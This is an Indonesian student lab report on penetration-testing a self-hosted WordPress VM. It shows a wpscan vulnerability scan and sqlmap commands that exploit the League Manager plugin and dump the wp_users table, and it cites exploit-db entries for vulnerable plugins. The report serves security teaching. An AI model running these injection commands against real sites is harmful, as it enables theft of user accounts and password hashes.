# PKSJ - Tugas 2

## Pendahuluan

**Anggota Kelompok**

| NRP         | Nama                     |
|-------------|--------------------------|
| 5113100050  | Freddy Hermawan Y        |
| 5113100109  | Daniel Fablius           |
| 5113100113  | Muhamad Luthfie La Roeha |

#### Penjelasan Tugas
**Tugas 2 :**
* Instal Wordpress pada sebuah virtual OS
* Instal plugin yang vulnerable terhadap SQL injection
* Instal/gunakan tool untuk uji SQL injection pada Wordpress
* Lakukan uji sql injection, scan vulnability dan catat hasil uji penetrasi 


## Dasar Teori


**1. OS yang digunakan**

* **Kali Linux** adalah 
Kali Linux adalah salah satu distribusi Linux tingkat lanjut untuk Penetration Testing dan audit keamanan, pembangunan kembali BackTrack Linux secara sempurna,  mengikuti sepenuhnya kepada standar pengembangan Debian.(http://id.docs.kali.org/introduction-id/apa-itu-kali-linux)

* **Ubuntu Server** adalah 
Ubuntu server adalah suatu desain ubuntu yang digunakan untuk diinstall di lingkungan enterprise atau perusahaan untuk keperluan seperti web server ataupun router, secara default versi server ini tidak menyertakan antarmuka GUI, yang ada hanya shell alias Command line,aplikasi bawaan dari ubuntu server sekedar info buat anda berupa aplikasi serveri webserver, DNS server, DHCP server, firewall, openSSH, dan applikasi yang berhubungan dengan server, teknologi yang dibenamkan diserver juga umumnya hanya dipakai oleh orang yang benar benar advanced di Linux. (https://etix.wordpress.com/2010/01/28/perbedaan-ubuntu-server-dan-desktop/)

**2. Tools yang digunakan**

*Wordpress Plugin*

* **Video Player v. 1.5.16**, 

* **League Manager 3.9.11**,

* **Booking Calendar**,

*Tools*

* **Sql Map**

* **Wpscan**

* **NTO sql Invader**

## Persiapan

#### 1. Langkah Instalasi Wordpress


#### 2. Konfigurasi Wordpress dan Install Wordpress Plugin


## Uji Sql Injection

#### 1. Uji Sql Injection dengan Wpscan

Pada tahap ini, kami melakukan sebuah skenario uji sql injection, yaitu :
1. Memindai semua vulnability yang terdapat dalam wordpress plugin yang telah di install


**Skenario 1** : Memindai semua vulnability yang terdapat dalam wordpress plugin yang telah di install

-  Menggunakan *Wpscan* untuk melakukan pindai yang terdapat vulnability dalam wordpress plugin dengan cara :
```
wpscan -u 10.151.36.5/html --enumerate vp
```
![Hasil Skenario 1](wpscan/1.PNG)
- Tunggu hingga proses Scanning selesai dilakukan. Seperti dibawah ini :

![Hasil Skenario 1](wpscan/2.PNG)

![Hasil Skenario 1](wpscan/3.PNG)

![Hasil Skenario 1](wpscan/4.PNG)

####2. Uji Sql Injection terhadap plugin wordpress leaguemanager v.3.9.11

Pada tahap ini, kami melakukan 2 skenario uji sql injection terhadap leaguemanager plugin, yaitu :
1. melakukan brute force sql injection yang terdapat dalam leaguemanager yang telah diinstall

**Skenario 1** : melakukan brute force sql injection yang terdapat dalam leaguemanager yang telah diinstall untuk dari match

-  Menggunakan *Sql Map* untuk melakukan sql injection terhadap leaguemanager untuk menggambil semua tables yang ada.
```
sqlmap -u "http://10.151.36.5/html/2016/10/12/match/?match=1" --dbms mysql --level 5 --risk 3 --tables
```
![Hasil Skenario 1](leaguemanager_3.9.11/1.PNG)

Hasil Uji dengan sqlmap dengan command seperti diatas adalah

![Hasil Skenario 1](leaguemanager_3.9.11/3.PNG)

![Hasil Skenario 1](leaguemanager_3.9.11/5b.PNG)

![Hasil Skenario 1](leaguemanager_3.9.11/5c.PNG)

![Hasil Skenario 1](leaguemanager_3.9.11/5d.PNG)

![Hasil Skenario 1](leaguemanager_3.9.11/5e.PNG)

![Hasil Skenario 1](leaguemanager_3.9.11/5f.PNG)

**Skenario 2** : melakukan brute force sql injection yang terdapat dalam leaguemanager yang telah diinstall untuk dari season

-  Menggunakan *Sql Map* untuk melakukan sql injection terhadap leaguemanager untuk menggambil semua tables yang ada.
```
sqlmap -u "http://10.151.36.5/html/2016/10/12/tik/?page_id=8&&season=1&&league_id=1&&match_day=1&&team_id=3" --dbms mysql --level 5 --risk 3 --tables
```
![Hasil Skenario 1](leaguemanager_3.9.11/6.PNG)

Hasil Uji dengan sqlmap dengan command seperti diatas adalah

![Hasil Skenario 1](leaguemanager_3.9.11/12.PNG)

![Hasil Skenario 1](leaguemanager_3.9.11/13.PNG)

![Hasil Skenario 1](leaguemanager_3.9.11/14.PNG)

![Hasil Skenario 1](leaguemanager_3.9.11/15.PNG)

- Menggunakan SqlMap untuk mendapatkan isi dari table wp_users.
```
python sqlmap.py --url "http://10.151.36.5/html/index.php/2016/10/12/tik/?match=3" --dbms mysql --level 5 --risk 3 -D wordpress -T wp_users --dump
```
Hasil Uji dengan sqlmap dengan command seperti diatas adalah

![Hasil Skenario 1](leaguemanager_3.9.11/16.PNG)

![Hasil Skenario 1](leaguemanager_3.9.11/17.PNG)

Sumber referensi : 
https://www.exploit-db.com/exploits/37182/
https://github.com/sqlmapproject/sqlmap/wiki/Usage

####3. Uji Sql Injection terhadap plugin wordpress video player v.1.5.16

Pada tahap ini, kami melakukan sebuah skenario uji sql injection terhadap video player plugin, yaitu :
1. melakukan brute force sql injection yang terdapat dalam video player yang telah diinstall

**Skenario 1** : menggunakan NTO sql invader untuk melakukan cek parameter yang mungkin terdapat vulnerable terhadap sql injection yang terdapat dalam post method.

- Menggunakan NTO sql invader untuk melakukan pengecekan terhadap parameter yang mungkin terdapat vulnerable terhadap sql injection yang terdapat dalam post method

Hasil uji coba

![Hasil Skenario 1](video_player_1.5.16/testnto.PNG)

Sumber referensi : https://www.exploit-db.com/exploits/38458/

####4. Uji Sql Injection terhadap plugin wordpress booking calendar 

Pada tahap ini, kami melakukan sebuah skenario uji sql injection terhadap booking calendar plugin, yaitu :


## Kesimpulan dan Saran
